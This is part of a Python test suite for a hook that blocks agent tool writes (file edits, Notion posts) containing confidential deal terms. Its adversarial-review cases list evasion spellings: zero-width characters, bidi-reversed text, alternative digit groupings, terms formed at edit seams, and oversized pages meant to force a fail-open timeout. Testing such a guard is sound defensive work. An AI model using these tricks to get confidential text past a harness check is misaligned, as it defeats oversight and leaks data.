expect_eq("normalization r5: an expired in-hook deadline raises ScanTooLarge (callers block)", True, _dl)

_ctx_fd, _ctx_roster = tempfile.mkstemp(prefix="synthetic-r5-terms-", suffix=".json")
with os.fdopen(_ctx_fd, "w", encoding="utf-8") as _f:
    json.dump({"deal-n": {"label": "Deal N", "active": True, "always": [_NAME],
                          "context": ["harbor point"], "context_requires_any": ["project quill"]}}, _f)
atexit.register(lambda: os.path.exists(_ctx_roster) and os.remove(_ctx_roster))


def run_seam_case(tail, timeout):
    p = os.path.join(_sd, "website-canonical", "seams.html")
    with open(p, "w", encoding="utf-8") as f:
        f.write("project quill harbor " + "ab QQ " * 20000 + tail)
    payload = {"tool_name": "Edit", "tool_input": {"file_path": p, "old_string": "QQ", "new_string": "", "replace_all": True}}
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_ctx_roster)
    try:
        r = subprocess.run([sys.executable, GUARD], input=json.dumps(payload), capture_output=True, text=True,
                           encoding="utf-8", env=env, timeout=timeout)
    except subprocess.TimeoutExpired:
        return 99, "timed out after %ss" % timeout
    return r.returncode, r.stderr


# 100k seams + a context anchor: anchor presence must be decided ONCE, not once per seam window
# (was O(seams x file): 80 s at 100k seams, fail-open by timeout).
_c, _e = run_seam_case("Zeph" + ZWSP + "yrine HolQQdings", 40)
expect("normalization r5: 20k-seam replace_all with a context anchor still blocks a term formed at the last seam", 2, _c, _e)
_c, _e = run_seam_case("Zeph" + ZWSP + "yrine HolQQdingz", 40)
expect("normalization r5: the same edit without a formed term is allowed, fast", 0, _c, _e)

# --- Round-6 (fifth adversarial review): oversized context file under an anchored roster ---
_bp = os.path.join(_sd, "website-canonical", "bigcjk.html")
with open(_bp, "w", encoding="utf-8") as _f:
    _f.write("<p>X" + chr(0x4E2D) * 1100000 + "</p>")
_env6 = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_ctx_roster)
_r6 = subprocess.run([sys.executable, GUARD], input=json.dumps(
    {"tool_name": "Edit", "tool_input": {"file_path": _bp, "old_string": "X", "new_string": "Y"}}),
    capture_output=True, text=True, encoding="utf-8", env=_env6, timeout=60)
expect("normalization r6: a 3.3 MB CJK page edited under an anchored roster is allowed (anchor treated as present)",
       0, _r6.returncode, _r6.stderr)
_r6 = subprocess.run([sys.executable, GUARD], input=json.dumps(
    {"tool_name": "Edit", "tool_input": {"file_path": _bp, "old_string": "X", "new_string": "Zeph" + ZWSP + "yrine Holdings"}}),
    capture_output=True, text=True, encoding="utf-8", env=_env6, timeout=60)
expect("normalization r6: ... but a term inserted into that same page still blocks", 2, _r6.returncode, _r6.stderr)

# --- Round-7 (sixth adversarial review): the seam-path ScanTooLarge guard, and context terms in over-budget pages ---
# An Edit whose new text expands past the NFKD output budget raises ScanTooLarge INSIDE the seam scan;
# main() must turn that into a block (exit 2). Without the try/except around the seam find_hit it
# would be an uncaught exception = exit 1 = a silent fail-open.
_sp4 = os.path.join(_sd, "website-canonical", "expand.html")
with open(_sp4, "w", encoding="utf-8") as _f:
    _f.write("<p>X</p>")
_c, _e = run_norm({"tool_name": "Edit", "tool_input": {"file_path": _sp4, "old_string": "X", "new_string": _FDFA * 300000}})
expect("normalization r7: an expanding Edit that exceeds the scan budget BLOCKS (exit 2), never exit 1", 2, _c, _e)
expect_eq("normalization r7: ... and says why (the seam scan failed closed)", True, "edit seam scan failed" in _e)

# A CONTEXT term formed across a seam in an over-budget page: the anchor is treated as present, so the
# term must still be found in the small window around the seam.
_bp2 = os.path.join(_sd, "website-canonical", "bigctx.html")
with open(_bp2, "w", encoding="utf-8") as _f:
    _f.write("<p>harbor X" + chr(0x4E2D) * 1100000 + "</p>")
_env7 = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_ctx_roster)
for _lbl, _new in (("plain", "point"), ("obfuscated", "po" + ZWSP + "int")):
    _r7 = subprocess.run([sys.executable, GUARD], input=json.dumps(
        {"tool_name": "Edit", "tool_input": {"file_path": _bp2, "old_string": "X", "new_string": _new}}),
        capture_output=True, text=True, encoding="utf-8", env=_env7, timeout=60)
    expect("normalization r7: context term (%s) completed at a seam of an over-budget page blocks" % _lbl, 2, _r7.returncode, _r7.stderr)

# --- Refute wf_d43de08e-49f on oxford-command-center PR #461: grouped numbers merged with an adjacent short
# number, mixed invisible-in-word + invisible-as-separator, anchors that normalize to nothing. Mirrors the
# 'refute round' block in tests/unit/confidential.test.ts. SYNTHETIC roster only. ---
_RT = {
    "deal-n": {"label": "Deal N", "active": True,
               "always": ["Zephyrine Holdings", "4250000", "Quillon Yard Associates"]},
    "deal-p": {"label": "Deal P", "active": True, "always": ["250000"]},
    "deal-e": {"label": "Deal E", "active": True, "always": [], "context": ["inert lagoon"],
               "context_requires_any": [ZWSP]},
    "deal-s": {"label": "Deal S", "active": True, "always": ["ice co"]},
}
for _lbl, _txt, _want in (
    ("grouped price followed by a percentage", "$4,250,000 100% leased", "Deal N"),
    ("space-grouped price followed by a count", "closing 4 250 000 100 units", "Deal N"),
    ("price with cents", "price $4,250,000.50 all cash", "Deal N"),
    ("grouped price then another figure", "Unit 12: 4,250,000 and 100 more", "Deal N"),
    ("trailing group of a short number", "Suite 7 250,000", "Deal P"),
    ("structured payload, short number first", _G.collect_text({"units": 3, "price": "250,000"}), "Deal P"),
    ("structured payload, short number last", _G.collect_text({"price": "250,000", "note": "x"}), "Deal P"),
    ("invisible in a word AND as the separator", "Zeph" + ZWSP + "yrine" + ZWSP + "Holdings", "Deal N"),
    ("invisible in one word, real space elsewhere", "Quillon" + ZWSP + "Yard Assoc" + ZWSP + "iates", "Deal N"),
    ("anchors that normalize to nothing leave context terms active", "notes on the inert lagoon parcel", "Deal E"),
):
    expect_eq("refute r8: %s" % _lbl, _want, nhit(_txt, _RT))
for _lbl, _txt in (
    ("inside a larger grouped number", "$1,250,000"),
    ("inside a billion-scale number", "$4,250,000,000"),
    ("next to extra digits", "$14,250,000 100%"),
    ("a trailing digit", "$4,250,0001"),
    ("the whitespace-insensitive match is not applied to short terms", "iceco"),
):
    expect_eq("refute r8: no hit for %s" % _lbl, None, nhit(_txt, _RT))

# Hook-side twin of the E2E: the MCP send path must block the mixed-invisible spelling too.
_c, _e = run_norm(notion_payload(NOTION, "Zeph" + ZWSP + "yrine" + ZWSP + "Holdings"))
expect("refute r8 e2e: mixed invisible spelling on a Notion write blocks", 2, _c, _e)

# --- Review ab2d0abb05d69ce38: terms that MIX words and a number, bidi + whitespace-insensitive match,
# a roster whose only anchor is the empty string. Mirrors the 'mixed word/number terms' block in
# tests/unit/confidential.test.ts. SYNTHETIC roster only. ---
_R9 = {
    "deal-m": {"label": "Deal M", "active": True, "always": ["250000 sf"]},
    "deal-c": {"label": "Deal C", "active": True, "always": ["250,000 sf"]},
    "deal-n": {"label": "Deal N", "active": True, "always": ["Zephyrine Holdings"]},
    "deal-q": {"label": "Deal Q", "active": True, "always": [], "context": ["quiet marsh"],
               "context_requires_any": [""]},
}
for _lbl, _txt in (
    ("a short number glued on before a grouped one", "Lot 3 250,000 sf"),
    ("dotted grouping with a short number before it", "Building 2 250.000 sf"),
    ("a comma-written term against dotted text", "Unit 12 250.000 sf"),
    ("a term WRITTEN with commas against plain digits", "about 250000 sf total"),
):
    # deal-m and deal-c are two spellings of the same figure; either label is a correct block.
    expect_eq("review r9: mixed word/number term - %s" % _lbl, True, nhit(_txt, _R9) in ("Deal M", "Deal C"))
_rev = ("Zephyrine" + ZWSP + "Holdings")[::-1]
expect_eq("review r9: bidi-override run that renders as a term with an invisible separator", "Deal N",
          nhit(chr(0x202E) + _rev + chr(0x202C), _R9))
expect_eq("review r9: an empty-string anchor keeps the group's context terms active (parity with TS)", "Deal Q",
          nhit("notes on the quiet marsh parcel", _R9))
expect_eq("review r9: _norm_variants compact form is a tuple (forward, plus reversed for bidi text)", 2,
          len(_G._norm_variants("a" + chr(0x202E) + "b")[2]))

# --- Refute wf_d730e33a-63b on 7e27407: a MIXED anchor list (one blank anchor + one real one), a term that
# mixes words and a number depending on its neighbours, '$ 4,250,000', plus a deterministic memoization check.
# Mirrors the 'anchors, term digit forms' block in tests/unit/confidential.test.ts. SYNTHETIC roster only. ---
for _lbl, _anchors in (("an empty anchor plus a real one", ["", "marsh holdings"]),
                       ("a zero-width-only anchor plus a real one", [ZWSP, "marsh holdings"]),
                       ("a space-only anchor plus a real one", [" ", "marsh holdings"])):
    _rq = {"deal-q": {"label": "Deal Q", "active": True, "always": [], "context": ["quiet marsh"],
                      "context_requires_any": _anchors}}
    expect_eq("review r10: a mixed anchor list stays always-active - %s" % _lbl, "Deal Q",
              nhit("quiet marsh update", _rq))
_rg = {"deal-q": {"label": "Deal Q", "active": True, "always": [], "context": ["quiet marsh"],
                  "context_requires_any": ["marsh holdings"]}}
expect_eq("review r10: a normal anchor list still gates its context terms", None, nhit("quiet marsh update", _rg))
expect_eq("review r10: ... and fires when the anchor is present", "Deal Q",
          nhit("quiet marsh update from marsh holdings", _rg))

_ru = {"deal-u": {"label": "Deal U", "active": True, "always": ["Unit 12 125,000 SF"]}}
for _lbl, _txt in (("space-grouped", "Unit 12 125 000 SF"), ("dotted", "Unit 12 125.000 SF"),
                   ("comma", "Unit 12 125,000 SF"), ("plain digits", "Unit 12 125000 SF")):
    expect_eq("review r10: a word+number term does not depend on its neighbours - %s" % _lbl, "Deal U",
              nhit(_txt, _ru))
_rd = {"deal-d": {"label": "Deal D", "active": True, "always": ["$ 4,250,000"]}}
expect_eq("review r10: a numeric term written with a space after the currency sign matches $4,250,000", "Deal D",
          nhit("price $4,250,000 cash", _rd))
expect_eq("review r10: ... and the bare digits", "Deal D", nhit("price 4250000 cash", _rd))

# Deterministic memoization check (replaces a wall-clock test): the anchor is looked up in the shared
# post-edit file ONCE, however many seam windows share it.
_big = "project quill " + "filler text " * 50
for _fn in (_G._raw_anchor, _G._norm_anchor):
    _fn.cache_clear()
for _i in range(2000):
    _G.find_hit("window %d" % _i, _NT, context_text=_big)
expect_eq("review r10: raw anchor computed once for 2000 windows over one file", 1, _G._raw_anchor.cache_info().misses)
expect_eq("review r10: normalized anchor computed once for 2000 windows over one file", 1, _G._norm_anchor.cache_info().misses)

# --- Refute wf_34b9b0ce-815 on 6067c75 (all LOW): a bare numeric term vs Indian lakh grouping.
# Mirrors the 'lakh grouping' block in tests/unit/confidential.test.ts. SYNTHETIC roster only. ---
_RL = {
    "deal-n": {"label": "Deal N", "active": True, "always": ["4250000"]},
    "deal-p": {"label": "Deal P", "active": True, "always": ["250000"]},
}
for _lbl, _txt, _want in (
    ("Indian lakh grouping", "price Rs 42,50,000 total", "Deal N"),
    ("lakh grouping of the shorter figure", "fee 2,50,000 due", "Deal P"),
    ("pair-grouped with spaces", "sum 25 00 00 only", "Deal P"),
    ("a bigger number that merely contains the digits (no hit)", "total 12,250,000 and 1,250,000", None),
):
    expect_eq("review r11: numeric term vs %s" % _lbl, _want, nhit(_txt, _RL))

# --- summary ---------------------------------------------------------------------------
passed = sum(1 for ok, _ in results if ok)
total = len(results)
print("\nconfidentiality-guard tests: %d/%d passed (%d derived variants from live terms file)" % (passed, total, len(VARIANTS)))
if passed != total:
    print("FAILURES PRESENT — guard is not safe to ship.")
    sys.exit(1)
print("ALL PASS — guard blocks every derived variant on every egress surface, "
      "allows internal use, and fails closed.")
sys.exit(0)
